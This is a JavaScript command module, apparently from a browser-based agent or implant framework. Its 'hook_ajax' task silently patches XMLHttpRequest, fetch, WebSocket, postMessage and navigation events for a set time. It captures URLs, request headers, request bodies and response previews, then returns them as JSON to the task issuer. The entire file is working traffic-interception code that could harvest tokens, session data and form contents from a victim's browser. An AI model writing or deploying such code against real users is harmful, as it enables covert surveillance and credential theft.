COMMANDS['hook_ajax'] = async function(task) {
    var params = parseParams(task);
    var duration = (params && params.duration) ? parseInt(params.duration) : 60;

    var captured = [];
    var hooked = [];

    // =====================================================================
    // Hook XMLHttpRequest
    // =====================================================================
    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;
    var origSetHeader = XMLHttpRequest.prototype.setRequestHeader;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._hookMethod = method;
        this._hookUrl = url;
        this._hookHeaders = {};
        return origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
        if (this._hookHeaders) this._hookHeaders[name] = value;
        return origSetHeader.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        var entry = {
            ts: new Date().toISOString(),
            type: 'XHR',
            method: this._hookMethod,
            url: this._hookUrl,
            requestHeaders: this._hookHeaders || {},
            requestBody: null
        };
        if (body) {
            var bodyStr = (typeof body === 'string') ? body : '[binary]';
            entry.requestBody = bodyStr.length > 2000 ? bodyStr.substring(0, 2000) + '...' : bodyStr;
        }

        var self = this;
        this.addEventListener('load', function() {
            entry.status = self.status;
            entry.responseLength = self.responseText ? self.responseText.length : 0;
            entry.responsePreview = self.responseText ? self.responseText.substring(0, 500) : '';
            captured.push(entry);
        });
        this.addEventListener('error', function() {
            entry.status = 'error';
            captured.push(entry);
        });

        return origSend.apply(this, arguments);
    };
    hooked.push('XHR');

    // =====================================================================
    // Hook fetch
    // =====================================================================
    var origFetch = window.fetch;
    window.fetch = function(input, init) {
        var url = (typeof input === 'string') ? input : (input.url || String(input));
        var method = (init && init.method) ? init.method : 'GET';
        var entry = {
            ts: new Date().toISOString(),
            type: 'fetch',
            method: method.toUpperCase(),
            url: url,
            requestHeaders: {},
            requestBody: null
        };

        if (init && init.headers) {
            try {
                if (init.headers instanceof Headers) {
                    init.headers.forEach(function(v, k) { entry.requestHeaders[k] = v; });
                } else {
                    entry.requestHeaders = init.headers;
                }
            } catch (e) {}
        }
        if (init && init.body) {
            var bodyStr = (typeof init.body === 'string') ? init.body : '[binary]';
            entry.requestBody = bodyStr.length > 2000 ? bodyStr.substring(0, 2000) + '...' : bodyStr;
        }

        return origFetch.apply(this, arguments).then(function(resp) {
            entry.status = resp.status;
            var clone = resp.clone();
            clone.text().then(function(t) {
                entry.responseLength = t.length;
                entry.responsePreview = t.substring(0, 500);
            }).catch(function() {});
            captured.push(entry);
            return resp;
        }).catch(function(err) {
            entry.status = 'error: ' + err.message;
            captured.push(entry);
            throw err;
        });
    };
    hooked.push('fetch');

    // =====================================================================
    // Hook WebSocket (if available)
    // =====================================================================
    var origWebSocket = null;
    if (typeof WebSocket !== 'undefined') {
        origWebSocket = window.WebSocket;

        window.WebSocket = function(url, protocols) {
            var ws = protocols
                ? new origWebSocket(url, protocols)
                : new origWebSocket(url);

            var wsUrl = url;

            // Hook send
            var origWsSend = ws.send.bind(ws);
            ws.send = function(data) {
                var preview = '';
                if (typeof data === 'string') {
                    preview = data.length > 500 ? data.substring(0, 500) + '...' : data;
                } else if (data instanceof ArrayBuffer) {
                    preview = '[ArrayBuffer ' + data.byteLength + ' bytes]';
                } else if (data instanceof Blob) {
                    preview = '[Blob ' + data.size + ' bytes]';
                } else {
                    preview = '[' + typeof data + ']';
                }

                captured.push({
                    ts: new Date().toISOString(),
                    type: 'WebSocket',
                    method: 'SEND',
                    url: wsUrl,
                    requestBody: preview,
                    requestHeaders: {},
                    status: 'outbound',
                    responseLength: typeof data === 'string' ? data.length : (data.byteLength || data.size || 0),
                    responsePreview: null
                });

                return origWsSend(data);
            };

            // Hook incoming messages
            ws.addEventListener('message', function(e) {
                var preview = '';
                var len = 0;
                if (typeof e.data === 'string') {
                    len = e.data.length;
                    preview = len > 500 ? e.data.substring(0, 500) + '...' : e.data;
                } else if (e.data instanceof ArrayBuffer) {
                    len = e.data.byteLength;
                    preview = '[ArrayBuffer ' + len + ' bytes]';
                } else if (e.data instanceof Blob) {
                    len = e.data.size;
                    preview = '[Blob ' + len + ' bytes]';
                }

                captured.push({
                    ts: new Date().toISOString(),
                    type: 'WebSocket',
                    method: 'RECV',
                    url: wsUrl,
                    requestBody: null,
                    requestHeaders: {},
                    status: 'inbound',
                    responseLength: len,
                    responsePreview: preview
                });
            });

            return ws;
        };

        // Preserve static properties so instanceof and READY_STATE checks work
        window.WebSocket.CONNECTING = origWebSocket.CONNECTING;
        window.WebSocket.OPEN = origWebSocket.OPEN;
        window.WebSocket.CLOSING = origWebSocket.CLOSING;
        window.WebSocket.CLOSED = origWebSocket.CLOSED;
        window.WebSocket.prototype = origWebSocket.prototype;

        hooked.push('WebSocket');
    }

    // =====================================================================
    // Hook postMessage (window.postMessage + incoming message events)
    // =====================================================================
    var origPostMessage = window.postMessage.bind(window);

    window.postMessage = function(message, targetOrigin, transfer) {
        var preview = '';
        try {
            preview = typeof message === 'string' ? message : JSON.stringify(message);
            if (preview.length > 500) preview = preview.substring(0, 500) + '...';
        } catch (e) {
            preview = '[unserializable]';
        }

        captured.push({
            ts: new Date().toISOString(),
            type: 'postMessage',
            method: 'SEND',
            url: targetOrigin || '*',
            requestBody: preview,
            requestHeaders: {},
            status: 'outbound',
            responseLength: preview.length,
            responsePreview: null
        });

        return origPostMessage(message, targetOrigin, transfer);
    };

    // Listen for incoming postMessage events
    function postMessageListener(e) {
        var preview = '';
        try {
            preview = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
            if (preview.length > 500) preview = preview.substring(0, 500) + '...';
        } catch (err) {
            preview = '[unserializable]';
        }

        captured.push({
            ts: new Date().toISOString(),
            type: 'postMessage',
            method: 'RECV',
            url: e.origin || 'unknown',
            requestBody: null,
            requestHeaders: {},
            status: 'inbound',
            responseLength: preview.length,
            responsePreview: preview
        });
    }
    window.addEventListener('message', postMessageListener, true);
    hooked.push('postMessage');

    // =====================================================================
    // Hook Navigation API (intercept link clicks, form submits, redirects)
    // =====================================================================
    var navHandler = null;
    try {
        if (window.navigation && navigation.addEventListener) {
            navHandler = function(e) {
                captured.push({
                    ts: new Date().toISOString(),
                    type: 'navigation',
                    method: e.navigationType || 'navigate',
                    url: e.destination ? e.destination.url : '',
                    requestBody: null,
                    requestHeaders: {},
                    status: e.userInitiated ? 'user' : 'programmatic',
                    responseLength: 0,
                    responsePreview: 'hashChange:' + e.hashChange + ' downloadRequest:' + (e.downloadRequest || '')
                });
            };
            navigation.addEventListener('navigate', navHandler);
            hooked.push('navigation');
        }
    } catch (e) {}

    // =====================================================================
    // Cleanup — restore all originals
    // =====================================================================
    function restoreHooks() {
        XMLHttpRequest.prototype.open = origOpen;
        XMLHttpRequest.prototype.send = origSend;
        XMLHttpRequest.prototype.setRequestHeader = origSetHeader;
        window.fetch = origFetch;
        if (origWebSocket) {
            window.WebSocket = origWebSocket;
        }
        window.postMessage = origPostMessage;
        window.removeEventListener('message', postMessageListener, true);
        if (navHandler && window.navigation) {
            try { navigation.removeEventListener('navigate', navHandler); } catch (e) {}
        }
    }

    // =====================================================================
    // Background task registration + wait
    // =====================================================================
    var cancelled = false;
    var timer;
    registerBackgroundTask(task.id, 'hook_ajax', function() {
        cancelled = true;
        if (timer) clearTimeout(timer);
        restoreHooks();
    });

    await new Promise(function(resolve) {
        timer = setTimeout(resolve, duration * 1000);
        var checkCancel = setInterval(function() {
            if (cancelled) {
                clearInterval(checkCancel);
                resolve();
            }
        }, 200);
    });

    if (!cancelled) {
        restoreHooks();
    }
    unregisterBackgroundTask(task.id);

    // =====================================================================
    // Build output with summary of what was hooked
    // =====================================================================
    var typeCounts = {};
    for (var i = 0; i < captured.length; i++) {
        var t = captured[i].type;
        typeCounts[t] = (typeCounts[t] || 0) + 1;
    }

    return JSON.stringify({
        duration: duration + 's',
        cancelled: cancelled,
        hooked: hooked,
        intercepted: captured.length,
        breakdown: typeCounts,
        requests: captured
    }, null, 2);
};
